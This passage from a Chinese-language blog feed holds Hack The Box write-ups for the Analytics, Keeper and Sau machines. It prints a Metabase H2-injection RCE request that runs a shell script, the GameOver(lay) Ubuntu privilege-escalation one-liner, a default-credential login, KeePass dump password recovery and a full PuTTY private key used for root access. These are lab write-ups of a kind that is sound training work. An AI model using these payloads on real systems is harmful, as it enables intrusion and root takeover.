class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /api/setup/validate HTTP/1.1</span><br><span class=\"line\">Host: data.analytical.htb</span><br><span class=\"line\">Content-Type:application/json</span><br><span class=\"line\">Cache-Control: max-age=0</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.9</span><br><span class=\"line\">Cookie: metabase.DEVICE=17645f70-ae73-4c86-a81c-ab6fdaa2ccf7</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Content-Length: 741</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    &quot;token&quot;: &quot;249fa03d-fd94-4d5b-b94f-b4ebf3df681f&quot;,</span><br><span class=\"line\">    &quot;details&quot;:</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        &quot;is_on_demand&quot;: false,</span><br><span class=\"line\">        &quot;is_full_sync&quot;: false,</span><br><span class=\"line\">        &quot;is_sample&quot;: false,</span><br><span class=\"line\">        &quot;cache_ttl&quot;: null,</span><br><span class=\"line\">        &quot;refingerprint&quot;: false,</span><br><span class=\"line\">        &quot;auto_run_queries&quot;: true,</span><br><span class=\"line\">        &quot;schedules&quot;:</span><br><span class=\"line\">        &#123;&#125;,</span><br><span class=\"line\">        &quot;details&quot;:</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &quot;db&quot;: &quot;zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\\njava.lang.Runtime.getRuntime().exec(&#x27;bash /tmp/2.sh&#x27;)\\n$$--=x&quot;,</span><br><span class=\"line\">            &quot;advanced-options&quot;: false,</span><br><span class=\"line\">            &quot;ssl&quot;: true</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        &quot;name&quot;: &quot;an-sec-research-team&quot;,</span><br><span class=\"line\">        &quot;engine&quot;: &quot;h2&quot;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>反弹成功</p>\n<p>在使用 env 可以得到 metalytics 的账号与密码</p>\n<p>然后使用 ssh 进行登录</p>\n<p>metabase 里面没有什么内容</p>\n<p>ssh 连接后 id 显示 1000</p>\n<p>在目录下有一个 flag</p>\n<h4 id=\"提权\"><a class=\"anchor\" href=\"#提权\">#</a> 提权</h4>\n<p>使用 sudo -l 发现没有用</p>\n<p>使用 uname</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2 x86_64 x86_64 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure></p>\n<p>查资料发现存在</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CVE-2023-2640 and CVE-2023-32629</span><br></pre></td></tr></table></figure></p>\n<p>只需要使用</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">unshare -rm sh -c &quot;mkdir l u w m &amp;&amp; cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &amp;&amp; touch m/*;&quot; &amp;&amp; u/python3 -c &#x27;import os;import pty;os.setuid(0);pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p>即可获取权限</p>\n",
            "tags": [
                "渗透"
            ]
        },
        {
            "id": "https://lookhui.github.io/HTB-Keeper/",
            "url": "https://lookhui.github.io/HTB-Keeper/",
            "title": "HTB-Keeper",
            "date_published": "2023-12-14T03:01:05.000Z",
            "content_html": "<h1 id=\"keeper\"><a class=\"anchor\" href=\"#keeper\">#</a> Keeper</h1>\n<h4 id=\"信息收集\"><a class=\"anchor\" href=\"#信息收集\">#</a> 信息收集</h4>\n<p>nmap 扫描</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-14 11:02 中国标准时间</span><br><span class=\"line\">Stats: 0:01:56 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan</span><br><span class=\"line\">SYN Stealth Scan Timing: About 81.23% done; ETC: 11:04 (0:00:26 remaining)</span><br><span class=\"line\">Nmap scan report for tickets.keeper.htb (10.10.11.227)</span><br><span class=\"line\">Host is up (0.38s latency).</span><br><span class=\"line\">Not shown: 998 closed tcp ports (reset)</span><br><span class=\"line\">PORT   STATE SERVICE</span><br><span class=\"line\">22/tcp open  ssh</span><br><span class=\"line\">80/tcp open  http</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 211.64 seconds</span><br></pre></td></tr></table></figure></p>\n<p>访问 ip 提示我没有令牌需要访问</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://tickets.keeper.htb/</span><br></pre></td></tr></table></figure></p>\n<p>添加 hosts</p>\n<p>进行目录扫描</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">000000835:   200        0 L      16 W       95 Ch       &quot;rtl&quot;</span><br><span class=\"line\">000001797:   200        0 L      16 W       95 Ch       &quot;rti&quot;</span><br><span class=\"line\">000001798:   200        0 L      16 W       95 Ch       &quot;rte&quot;</span><br><span class=\"line\">000002829:   403        0 L      0 W        0 Ch        &quot;l&quot;</span><br><span class=\"line\">000002830:   200        111 L    182 W      2309 Ch     &quot;m&quot;</span><br><span class=\"line\">000005145:   200        0 L      16 W       95 Ch       &quot;rt03&quot;</span><br><span class=\"line\">000005144:   200        0 L      16 W       95 Ch       &quot;rt234&quot;</span><br><span class=\"line\">000005143:   200        0 L      16 W       95 Ch       &quot;rtcase&quot;</span><br><span class=\"line\">000005141:   200        0 L      16 W       95 Ch       &quot;rtisv1&quot;</span><br><span class=\"line\">000005139:   200        0 L      16 W       95 Ch       &quot;rtl_img&quot;</span><br><span class=\"line\">000005142:   200        0 L      16 W       95 Ch       &quot;rthib1&quot;</span><br><span class=\"line\">000005140:   200        0 L      16 W       95 Ch       &quot;rtl_images&quot;</span><br><span class=\"line\">000018972:   200        0 L      16 W       95 Ch       &quot;rtpnc&quot;</span><br><span class=\"line\">000018984:   200        0 L      16 W       95 Ch       &quot;rt1&quot;</span><br><span class=\"line\">000018982:   200        0 L      16 W       95 Ch       &quot;rt3&quot;</span><br><span class=\"line\">000018981:   200        0 L      16 W       95 Ch       &quot;rt35&quot;</span><br><span class=\"line\">000018980:   200        0 L      16 W       95 Ch       &quot;rt4&quot;</span><br><span class=\"line\">000018979:   200        0 L      16 W       95 Ch       &quot;rt6&quot;</span><br><span class=\"line\">000018978:   200        0 L      16 W       95 Ch       &quot;rtech&quot;</span><br><span class=\"line\">000018977:   200        0 L      16 W       95 Ch       &quot;rtifs1&quot;</span><br><span class=\"line\">000018976:   200        0 L      16 W       95 Ch       &quot;rtifs2&quot;</span><br><span class=\"line\">000018974:   200        0 L      16 W       95 Ch       &quot;rtm.log&quot;</span><br><span class=\"line\">000018971:   200        0 L      16 W       95 Ch       &quot;rtr&quot;</span><br><span class=\"line\">000018973:   200        0 L      16 W       95 Ch       &quot;rtp&quot;</span><br><span class=\"line\">000018970:   200        0 L      16 W       95 Ch       &quot;rtr1&quot;</span><br><span class=\"line\">000018969:   200        0 L      16 W       95 Ch       &quot;rtr2&quot;</span><br><span class=\"line\">000018983:   200        0 L      16 W       95 Ch       &quot;rt25&quot;</span><br><span class=\"line\">000018968:   200        0 L      16 W       95 Ch       &quot;rts&quot;</span><br><span class=\"line\">000018967:   200        0 L      16 W       95 Ch       &quot;rtsc&quot;</span><br><span class=\"line\">000018966:   200        0 L      16 W       95 Ch       &quot;rtsmcse&quot;</span><br><span class=\"line\">000018965:   200        0 L      16 W       95 Ch       &quot;rtsp.php&quot;</span><br><span class=\"line\">000018964:   200        0 L      16 W       95 Ch       &quot;rtsxt1&quot;</span><br><span class=\"line\">000018975:   200        0 L      16 W       95 Ch       &quot;rtm&quot;</span><br><span class=\"line\">000018985:   200        153 L    325 W      4236 Ch     &quot;rt&quot;</span><br></pre></td></tr></table></figure></p>\n<p>发现 m 那里能进行登录直接进去</p>\n<p>跳转登录界面</p>\n<p>显示了 rt 4.4.4+dfsg-2ubuntu1 服务版本信息</p>\n<p>搜索默认密码尝试</p>\n<p>root/password</p>\n<p>登录成功</p>\n<p>收集信息</p>\n<p>发现用户除了 root 还有一个 lnorgaard</p>\n<p>并且在备注那里看到了密码</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">New user. Initial password set to Welcome2023!</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"获得shell\"><a class=\"anchor\" href=\"#获得shell\">#</a> 获得 shell</h4>\n<p>猜测这个密码是 ssh 连接密码进行连接查看</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">└─$ ssh lnorgaard@10.10.11.227</span><br><span class=\"line\">The authenticity of host &#x27;10.10.11.227 (10.10.11.227)&#x27; can&#x27;t be established.</span><br><span class=\"line\">ED25519 key fingerprint is SHA256:hczMXffNW5M3qOppqsTCzstpLKxrvdBjFYoJXJGpr7w.</span><br><span class=\"line\">This key is not known by any other names.</span><br><span class=\"line\">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class=\"line\">Warning: Permanently added &#x27;10.10.11.227&#x27; (ED25519) to the list of known hosts.</span><br><span class=\"line\">lnorgaard@10.10.11.227&#x27;s password:</span><br><span class=\"line\">Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)</span><br><span class=\"line\"></span><br><span class=\"line\"> * Documentation:  https://help.ubuntu.com</span><br><span class=\"line\"> * Management:     https://landscape.canonical.com</span><br><span class=\"line\"> * Support:        https://ubuntu.com/advantage</span><br><span class=\"line\">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class=\"line\"></span><br><span class=\"line\">You have mail.</span><br><span class=\"line\">Last login: Thu Dec 14 04:05:37 2023 from 10.10.14.19</span><br><span class=\"line\">lnorgaard@keeper:~$</span><br></pre></td></tr></table></figure></p>\n<p>登录成功</p>\n<p>在 user.txt 文件中拿下他的第一个 flag</p>\n<h4 id=\"提取\"><a class=\"anchor\" href=\"#提取\">#</a> 提取</h4>\n<p>发现 sudo 无法执行</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lnorgaard@keeper:~$ sudo -l</span><br><span class=\"line\">[sudo] password for lnorgaard:</span><br><span class=\"line\">Sorry, user lnorgaard may not run sudo on keeper.</span><br><span class=\"line\">lnorgaard@keeper:~$ sudo su</span><br><span class=\"line\">[sudo] password for lnorgaard:</span><br><span class=\"line\">lnorgaard is not in the sudoers file.  This incident will be reported.</span><br></pre></td></tr></table></figure></p>\n<p>解压目录下的压缩包</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lnorgaard@keeper:~$ unzip RT30000.zip -d ./cc</span><br><span class=\"line\">Archive:  RT30000.zip</span><br><span class=\"line\">  inflating: ./cc/KeePassDumpFull.dmp</span><br><span class=\"line\"> extracting: ./cc/passcodes.kdbx</span><br></pre></td></tr></table></figure></p>\n<p>出现了一个 kdbx 和一个 dmp 文件</p>\n<p>通过 scp 把 kdbx 和 dmp 以及 poc.py 都传到本地试试</p>\n<p>使用 python3 <span class=\"exturl\" data-url=\"aHR0cDovL3BvYy5weQ==\">poc.py</span> -d ./cc/KeePassDumpFull.dmp</p>\n<p>得到几长串字符通过后面一直没有变的</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">med flode</span><br></pre></td></tr></table></figure></p>\n<p>使用谷歌搜索，搜索到了</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rødgrød med fløde</span><br></pre></td></tr></table></figure></p>\n<p>一种甜品名称</p>\n<p>使用 KeePass.exe 打开 KeePassDumpFull.dmp</p>\n<p>输入密码</p>\n<p>得到 notes</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PuTTY-User-Key-File-3: ssh-rsa</span><br><span class=\"line\">Encryption: none</span><br><span class=\"line\">Comment: rsa-key-20230519</span><br><span class=\"line\">Public-Lines: 6</span><br><span class=\"line\">AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D</span><br><span class=\"line\">8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T</span><br><span class=\"line\">EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM</span><br><span class=\"line\">Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu</span><br><span class=\"line\">FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ</span><br><span class=\"line\">LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et</span><br><span class=\"line\">Private-Lines: 14</span><br><span class=\"line\">AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j</span><br><span class=\"line\">oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih</span><br><span class=\"line\">kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY</span><br><span class=\"line\">f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT</span><br><span class=\"line\">VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz</span><br><span class=\"line\">UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs</span><br><span class=\"line\">OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz</span><br><span class=\"line\">in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r</span><br><span class=\"line\">SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV</span><br><span class=\"line\">09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa</span><br><span class=\"line\">xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA</span><br><span class=\"line\">AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD</span><br><span class=\"line\">AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy</span><br><span class=\"line\">NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=</span><br><span class=\"line\">Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0</span><br></pre></td></tr></table></figure></p>\n<p>将这个使用 puttygen 去转换为 id_rsa</p>\n<p>如</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">puttygen keeper.ppk -O private-openssh -o id_rsa</span><br></pre></td></tr></table></figure></p>\n<p>得到后 chmod 777 id_rsa 给个权限</p>\n<p>使用 ssh -i id_rsa root@10.10.11.227 成功登录 root</p>\n<p>然后得到 flag2</p>\n",
            "tags": [
                "渗透"
            ]
        },
        {
            "id": "https://lookhui.github.io/HTB-Sau/",
            "url": "https://lookhui.github.io/HTB-Sau/",
            "title": "HTB-Sau",
            "date_published": "2023-12-14T00:50:56.000Z",
            "content_html": "<h1 id=\"sau\"><a class=\"anchor\" href=\"#sau\">#</a> Sau</h1>\n<h4 id=\"信息收集\"><a class=\"anchor\" href=\"#信息收集\">#</a> 信息收集</h4>\n<p>获得靶机 ip</p>\n<p>使用 nmap 扫描同时使用浏览器访问查看一下</p>\n<p>发现访问后没有出现内容</p>\n<p>nmap 扫描结束内容如下</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-14 08:52 中国标准时间</span><br><span class=\"line\">Stats: 0:01:24 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan</span><br><span class=\"line\">SYN Stealth Scan Timing: About 72.40% done; ETC: 08:54 (0:00:32 remaining)</span><br><span class=\"line\">Nmap scan report for bogon (10.10.11.224)</span><br><span class=\"line\">Host is up (0.35s latency).</span><br><span class=\"line\">Not shown: 997 closed tcp ports (reset)</span><br><span class=\"line\">PORT      STATE    SERVICE</span><br><span class=\"line\">22/tcp    open     ssh</span><br><span class=\"line\">80/tcp    filtered http</span><br><span class=\"line\">55555/tcp open     unknown</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 112.22 seconds</span><br></pre></td></tr></table></figure></p>\n<p>这里的 80 端口显示被过滤了那我们使用 nmap -sF 来进行扫描这个端口看看</p>\n<p>tips: FIN 为 TCP 会话结束标志，在 FIN 扫描中一个设置了 FIN 位的数据包被发送后，若响应 RST 数据包，则表示端口关闭，没有响应则表示开放。此类扫描同样不能准确判断 windows 系统上端口开发情况，适合探测 Linux 系统上的端口开放情况</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Host is up (0.39s latency).</span><br><span class=\"line\"></span><br><span class=\"line\">PORT   STATE         SERVICE</span><br><span class=\"line\">80/tcp open|filtered http</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 5.34 second</span><br></pre></td></tr></table></figure></p>\n<p>发现是打开的没问题</p>\n<p>然后访问开启的 55555 端口发现可以</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://10.10.11.224:55555/</span><br></pre></td></tr></table></figure></p>\n<p>使用详细扫描扫描到了</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PORT      STATE    SERVICE VERSION</span><br><span class=\"line\">22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)</span><br><span class=\"line\">80/tcp    filtered http</span><br><span class=\"line\">55555/tcp open     unknown</span><br><span class=\"line\">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class=\"line\">SF-Port55555-TCP:V=7.93%I=7%D=12/14%Time=657A52FF%P=i686-pc-windows-window</span><br><span class=\"line\">SF:s%r(GetRequest,A2,&quot;HTTP/1\\.0\\x20302\\x20Found\\r\\nContent-Type:\\x20text/h</span><br><span class=\"line\">SF:tml;\\x20charset=utf-8\\r\\nLocation:\\x20/web\\r\\nDate:\\x20Thu,\\x2014\\x20De</span><br><span class=\"line\">SF:c\\x202023\\x2000:57:37\\x20GMT\\r\\nContent-Length:\\x2027\\r\\n\\r\\n&lt;a\\x20href</span><br><span class=\"line\">SF:=\\&quot;/web\\&quot;&gt;Found&lt;/a&gt;\\.\\n\\n&quot;)%r(GenericLines,67,&quot;HTTP/1\\.1\\x20400\\x20Bad\\</span><br><span class=\"line\">SF:x20Request\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnecti</span><br><span class=\"line\">SF:on:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request&quot;)%r(HTTPOptions,60,&quot;HTTP/1\\.0</span><br><span class=\"line\">SF:\\x20200\\x20OK\\r\\nAllow:\\x20GET,\\x20OPTIONS\\r\\nDate:\\x20Thu,\\x2014\\x20De</span><br><span class=\"line\">SF:c\\x202023\\x2000:57:40\\x20GMT\\r\\nContent-Length:\\x200\\r\\n\\r\\n&quot;)%r(RTSPRe</span><br><span class=\"line\">SF:quest,67,&quot;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/p</span><br><span class=\"line\">SF:lain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Req</span><br><span class=\"line\">SF:uest&quot;)%r(Help,67,&quot;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x</span><br><span class=\"line\">SF:20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Ba</span><br><span class=\"line\">SF:d\\x20Request&quot;)%r(SSLSessionReq,67,&quot;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r</span><br><span class=\"line\">SF:\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close</span><br><span class=\"line\">SF:\\r\\n\\r\\n400\\x20Bad\\x20Request&quot;)%r(TerminalServerCookie,67,&quot;HTTP/1\\.1\\x2</span><br><span class=\"line\">SF:0400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8</span><br><span class=\"line\">SF:\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request&quot;)%r(TLSSessionReq</span><br><span class=\"line\">SF:,67,&quot;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;</span><br><span class=\"line\">SF:\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request&quot;</span><br><span class=\"line\">SF:)%r(Kerberos,67,&quot;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x2</span><br><span class=\"line\">SF:0text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad</span><br><span class=\"line\">SF:\\x20Request&quot;)%r(FourOhFourRequest,EA,&quot;HTTP/1\\.0\\x20400\\x20Bad\\x20Reques</span><br><span class=\"line\">SF:t\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nX-Content-Type-Op</span><br><span class=\"line\">SF:tions:\\x20nosniff\\r\\nDate:\\x20Thu,\\x2014\\x20Dec\\x202023\\x2000:58:14\\x20</span><br><span class=\"line\">SF:GMT\\r\\nContent-Length:\\x2075\\r\\n\\r\\ninvalid\\x20basket\\x20name;\\x20the\\x</span><br><span class=\"line\">SF:20name\\x20does\\x20not\\x20match\\x20pattern:\\x20\\^\\[\\\\w\\\\d\\\\-_\\\\\\.\\]&#123;1,25</span><br><span class=\"line\">SF:0&#125;\\$\\n&quot;)%r(LPDString,67,&quot;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-</span><br><span 